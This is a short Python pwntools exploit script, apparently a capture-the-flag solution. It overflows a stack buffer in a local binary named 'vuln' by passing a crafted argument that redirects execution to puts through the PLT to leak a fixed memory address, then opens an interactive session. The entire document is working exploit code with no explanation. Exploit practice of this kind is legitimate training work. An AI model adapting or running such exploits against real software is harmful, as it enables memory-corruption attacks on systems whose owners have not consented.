from pwn import *
context.log_level = "debug"
elf = ELF("./vuln")
payload = "a" * 0x18 + "b" * 0x4 + p32(elf.plt["puts"]) + p32(0xdeadbeef) + p32(0x0804A080) 
p = process(argv=["./vuln" , payload])
p.interactive()